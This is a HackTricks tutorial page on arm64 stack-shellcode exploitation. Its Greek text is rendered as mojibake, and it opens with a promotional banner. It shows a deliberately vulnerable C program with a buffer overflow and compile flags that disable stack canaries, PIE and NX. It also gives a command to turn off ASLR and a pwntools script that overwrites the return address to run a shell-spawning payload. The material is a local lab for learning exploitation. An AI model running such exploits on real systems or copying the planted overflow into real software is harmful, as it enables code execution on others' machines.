# ÎšÏÎ´Î¹ÎºÎ±Ï‚ Shellcode Î£Ï„Î¿ Stack - arm64

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº ÏƒÏ„Î¿ AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Î•Î¹Î´Î¹ÎºÏŒÏ‚ Red Team Ï„Î¿Ï… HackTricks ÏƒÏ„Î¿ AWS)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Ï…Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î·Ï‚ Ï„Î¿Ï… HackTricks:

* Î‘Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î´Î¹Î±Ï†Î·Î¼Î¹ÏƒÎ¼Î­Î½Î· ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>

Î’ÏÎµÎ¯Ï„Îµ Î¼Î¹Î± ÎµÎ¹ÏƒÎ±Î³Ï‰Î³Î® ÏƒÏ„Î¿ arm64 ÏƒÏ„Î¿:

{% content-ref url="../../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

## ÎšÏÎ´Î¹ÎºÎ±Ï‚&#x20;
```c
#include <stdio.h>
#include <unistd.h>

void vulnerable_function() {
char buffer[64];
read(STDIN_FILENO, buffer, 256); // <-- bof vulnerability
}

int main() {
vulnerable_function();
return 0;
}
```
ÎœÎµÏ„Î±Î³Î»ÏÏ„Ï„Î¹ÏƒÎ· Ï‡Ï‰ÏÎ¯Ï‚ pie, canary ÎºÎ±Î¹ nx:

{% code overflow="wrap" %}
```bash
clang -o bof bof.c -fno-stack-protector -Wno-format-security -no-pie -z execstack
```
## Î§Ï‰ÏÎ¯Ï‚ ASLR & Î§Ï‰ÏÎ¯Ï‚ canary - Î¥Ï€ÎµÏÏ‡ÎµÎ¯Î»Î¹ÏƒÎ· Î£Ï„Î¿Î¯Î²Î±Ï‚

Î“Î¹Î± Î½Î± ÏƒÏ„Î±Î¼Î±Ï„Î®ÏƒÎµÏ„Îµ Ï„Î¿ ASLR ÎµÎºÏ„ÎµÎ»Î­ÏƒÏ„Îµ:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
Î“Î¹Î± Î½Î± Ï€Î¬ÏÎµÏ„Îµ Ï„Î¿ [**offset Ï„Î¿Ï… bof ÎµÎ»Î­Î³Î¾Ï„Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ link**](../ret2win/ret2win-arm64.md#finding-the-offset).

Exploit:
```python
from pwn import *

# Load the binary
binary_name = './bof'
elf = context.binary = ELF(binary_name)

# Generate shellcode
shellcode = asm(shellcraft.sh())

# Start the process
p = process(binary_name)

# Offset to return address
offset = 72

# Address in the stack after the return address
ret_address = p64(0xfffffffff1a0)

# Craft the payload
payload = b'A' * offset + ret_address + shellcode

print("Payload length: "+ str(len(payload)))

# Send the payload
p.send(payload)

# Drop to an interactive session
p.interactive()
```
Î¤Î¿ Î¼ÏŒÎ½Î¿ "Ï€ÎµÏÎ¯Ï€Î»Î¿ÎºÎ¿" Ï€ÏÎ¬Î³Î¼Î± Ï€Î¿Ï… Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î²ÏÎµÎ¯Ï„Îµ ÎµÎ´Ï ÎµÎ¯Î½Î±Î¹ Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· ÏƒÏ„Î¿ stack Î³Î¹Î± Î½Î± ÎºÎ±Î»Î­ÏƒÎµÏ„Îµ. Î£Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ® Î¼Î¿Ï… Î´Î·Î¼Î¹Î¿ÏÏÎ³Î·ÏƒÎ± Ï„Î¿ exploit Î¼Îµ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï€Î¿Ï… Î²ÏÎ­Î¸Î·ÎºÎµ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ gdb, Î±Î»Î»Î¬ ÏŒÏ„Î±Î½ Ï€ÏÎ¿ÏƒÏ€Î¬Î¸Î·ÏƒÎ± Î½Î± Ï„Î¿ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„Ï Î´ÎµÎ½ Î»ÎµÎ¹Ï„Î¿ÏÏÎ³Î·ÏƒÎµ (ÎµÏ€ÎµÎ¹Î´Î® Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï„Î¿Ï… stack Î¬Î»Î»Î±Î¾Îµ Î»Î¯Î³Î¿).

Î†Î½Î¿Î¹Î¾Î± Ï„Î¿ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¼Î­Î½Î¿ **`Î±ÏÏ‡ÎµÎ¯Î¿ core`** (`gdb ./bog ./core`) ÎºÎ±Î¹ ÎµÎ»Î­Î³Ï‡Î¸Î·ÎºÎµ Î· Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÎ® Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï„Î·Ï‚ Î­Î½Î±ÏÎ¾Î·Ï‚ Ï„Î¿Ï… shellcode.
